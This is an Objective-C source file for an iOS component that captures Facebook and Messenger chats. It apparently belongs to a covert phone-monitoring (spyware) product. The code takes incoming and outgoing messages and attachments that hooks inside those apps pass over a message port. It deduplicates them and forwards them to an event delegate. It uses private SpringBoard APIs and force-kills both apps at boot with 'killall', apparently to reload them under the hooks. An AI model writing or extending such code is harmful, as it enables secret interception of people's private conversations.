//
//  FacebookCaptureManager.m
//  FacebookCaptureManager
//
//  Created by Makara Khloth on 12/24/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "FacebookCaptureManager.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxAttachment.h"
#import "SpringBoardServices.h"
#import "SBDidLaunchNotifier.h"
#import "FxIMEventUtils.h"
#import "DaemonPrivateHome.h"

@interface FacebookCaptureManager (private)
- (void) filterIncomingFacebookEvent: (FxIMEvent *) aEvent;
- (void) sendIMEvents: (NSArray *) aIMEvents;
- (void) sendIMEvent: (FxIMEvent *) aFxIMEvent;
- (BOOL) isMessengerAppInstalled;
- (BOOL) isMessengerAppRunning;
- (NSString *) getFrontMostApplication;
- (void) springboardDidLaunch;
//- (void) insertMessageIdToPlist:(NSString *)aMessageId;
@end

#define FACEBOOK_INDENTIFIER	@"com.facebook.Facebook"
#define MESSENGER_INDENTIFIER	@"com.facebook.Messenger"

@implementation FacebookCaptureManager

@synthesize mEventDelegate;

- (id) init {
	if ((self = [super init])) {
		mSBNotifier = [[SBDidLaunchNotifier alloc] init];
		[mSBNotifier setMDelegate:self];
		[mSBNotifier setMSelector:@selector(springboardDidLaunch)];
		mFacebookEvents = [[NSMutableArray alloc] init];
	}
	return (self);
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
	[self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
	[self setMEventDelegate:nil];
}

- (void) startCapture {
	DLog (@"Start capture Facebook messenger");
	if (!mMessagePortReader) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kFacebookMessagePort 
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
		[mSBNotifier start];
	}
}

- (void) stopCapture {
	DLog (@"Stop capture Facebook messenger");
	if (mMessagePortReader) {
		[mMessagePortReader stop];
		[mMessagePortReader release];
		mMessagePortReader = nil;
		
		[mSBNotifier stop];
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    NSDictionary *fbInfo = [unarchiver decodeObjectForKey:kFacebookArchied];
	NSString *bundleIdentifier = [fbInfo objectForKey:@"bundle"];
	FxIMEvent *imEvent = [fbInfo objectForKey:@"IMEvent"];
    [unarchiver finishDecoding];
	DLog(@"Facebook - imEvent = %@, bundle = %@", imEvent, bundleIdentifier);
	
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		//[self insertMessageIdToPlist:[imEvent mOfflineThreadId]];
		
		if ([imEvent mDirection] == kEventDirectionIn) {
			
			/*if ([bundleIdentifier isEqualToString:MESSENGER_INDENTIFIER]) {
				[self sendIMEvent:imEvent];
			} else if ([bundleIdentifier isEqualToString:FACEBOOK_INDENTIFIER]) {
				if (![self isMessengerAppRunning]) {
					[self sendIMEvent:imEvent];
				}
			}*/
			
			[NSObject cancelPreviousPerformRequestsWithTarget:self];
			[self filterIncomingFacebookEvent:imEvent];
			[self performSelector:@selector(sendIMEvents:)
					   withObject:mFacebookEvents
					   afterDelay:2.0];
			
		} else if ([imEvent mDirection] == kEventDirectionOut) {
			NSString *frontMostApplicationIdentifier = [self getFrontMostApplication];
			if ([frontMostApplicationIdentifier isEqualToString:bundleIdentifier]) {
				[self sendIMEvent:imEvent];
			} else {
				// Delete the attachments if exist
				NSFileManager *fileManager = [NSFileManager defaultManager];
				for (FxAttachment *attachment in [imEvent mAttachments]) {
					[fileManager removeItemAtPath:[attachment fullPath] error:nil];
				}
			}
		}
		
	}
	[unarchiver release];
}

- (void) filterIncomingFacebookEvent: (FxIMEvent *) aEvent {
	BOOL fbEventDuplicate = NO;
	for (FxIMEvent *fbEvent in mFacebookEvents) {
		// Incoming fb event from the same sender and have the same message Id thus treat only one message
		if ([[fbEvent mUserID] isEqualToString:[aEvent mUserID]]			&&
			[[fbEvent mMessageIdOfIM] isEqualToString:[aEvent mMessageIdOfIM]]) {
			fbEventDuplicate = YES;
			break;
		}
	}
	
	if (!fbEventDuplicate) {
		[mFacebookEvents addObject:aEvent];
	} else {
		// Delete attachment if exist
		NSFileManager *fileManager = [NSFileManager defaultManager];
		for (FxAttachment *attachment in [aEvent mAttachments]) {
			[fileManager removeItemAtPath:[attachment fullPath] error:nil];
		}
	}
}
//- ( void ) insertMessageIdToPlist:(NSString *)aMessageId{
//	int index = 0;
//	NSString *path = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/imFacebook/"];
//    path = [path stringByAppendingPathComponent:@"FacebookMID.plist"]; 
//	
//	NSFileManager *fileManager = [NSFileManager defaultManager];
//
//
//	DLog(@" ********* path %@",path);
//    if ([fileManager fileExistsAtPath: path]){
//		DLog(@" ********* File Exist");
//		BOOL FoundDuplicate = NO;
//        NSMutableDictionary* data = [[NSMutableDictionary alloc] initWithContentsOfFile: path];
//		
//		NSString * tmpMessageId = nil;
//		
//		for(int i=0;i<[[data allKeys]count];i++){
//			tmpMessageId = [data objectForKey:[[data allKeys]objectAtIndex:i]];
//			if([tmpMessageId isEqualToString:aMessageId]){
//				FoundDuplicate = YES;
//			}
//		}
//		if (!FoundDuplicate) {
//			index = [[data objectForKey:@"currentindex"]intValue];
//			if(index == 100){
//				index = 1;
//				[data setObject:[NSString stringWithFormat:@"%d",index] forKey:@"currentindex"];
//				[data setObject:aMessageId forKey:[NSString stringWithFormat:@"%d",index]];
//				DLog(@"data: %@",data);
//				[data writeToFile: path atomically:YES];
//			}else{
//				index = index + 1;
//				[data setObject:[NSString stringWithFormat:@"%d",index] forKey:@"currentindex"];
//				[data setObject:aMessageId forKey:[NSString stringWithFormat:@"%d",index]];
//				DLog(@"data: %@",data);
//				[data writeToFile: path atomically:YES];
//			}
//		}
//		[data release];
//    }else{
//		DLog(@" ********* File Does n't Exist");
//		NSMutableDictionary * data = [[NSMutableDictionary alloc] init];
//		index = 1;
//		[data setObject:[NSString stringWithFormat:@"%d",index] forKey:@"currentindex"];
//		[data setObject:aMessageId forKey:[NSString stringWithFormat:@"%d",index]];
//		DLog(@"data: %@",data);
//		[data writeToFile: path atomically:YES];
//		[data release];
//    }
//}
- (void) sendIMEvents: (NSArray *) aIMEvents {
	for (FxIMEvent *fbEvent in aIMEvents) {
		[self sendIMEvent:fbEvent];
	}
	[mFacebookEvents removeAllObjects];
}

- (void) sendIMEvent: (FxIMEvent *) aFxIMEvent {
	NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:aFxIMEvent];
	for (FxEvent *imStructureEvent in imStructureEvents) {
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];
	}
}

- (BOOL) isMessengerAppInstalled {
	BOOL messengerInstalled = NO;
	NSDictionary *plistContent = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/User/Library/Caches/com.apple.mobile.installation.plist"];
	NSDictionary *userInstalledApp = [[NSDictionary alloc] initWithDictionary:[plistContent objectForKey:@"User"]];
	for (NSString* appKey in [userInstalledApp allKeys]) {	
		NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
		NSDictionary *appInfo = [userInstalledApp objectForKey:appKey];
		if ([[appInfo objectForKey:@"CFBundleIdentifier"] isEqualToString:MESSENGER_INDENTIFIER]) {
			messengerInstalled = YES;
			[pool release];
			pool = nil;
			break;
		}
		[pool release];
		pool = nil;
	}
	[plistContent release];
	[userInstalledApp release];
	return (messengerInstalled);
}

- (BOOL) isMessengerAppRunning {
	BOOL messengerRunning = NO;
	NSArray *activeApps = (NSArray *)SBSCopyApplicationDisplayIdentifiers(YES, NO);
	DLog (@"All active apps = %@", activeApps);
	for (NSString *bundleIdentifier in activeApps) {
		if ([bundleIdentifier isEqualToString:MESSENGER_INDENTIFIER]) {
			messengerRunning = YES;
			break;
		}
	}
	[activeApps release];
	return (messengerRunning);
}

- (NSString *) getFrontMostApplication {
	
	mach_port_t *p = (mach_port_t *) SBSSpringBoardServerPort();
	char frontmostAppS[256];
	memset(frontmostAppS, sizeof(frontmostAppS), 0);
	SBFrontmostApplicationDisplayIdentifier(p,frontmostAppS);
	
	NSString * frontmostApp = [NSString stringWithFormat:@"%s",frontmostAppS];
	DLog(@"Frontmost app is %@", frontmostApp);
	return (frontmostApp);
}

- (void) springboardDidLaunch {
	system("killall Facebook"); // Facebook
	system("killall Messenger"); // Messenger
}

- (void) prerelease {
	[NSObject cancelPreviousPerformRequestsWithTarget:self];
}

- (void) dealloc {
	[self stopCapture];
	
	[mSBNotifier release];
	[mFacebookEvents release];
	[super dealloc];
}

@end
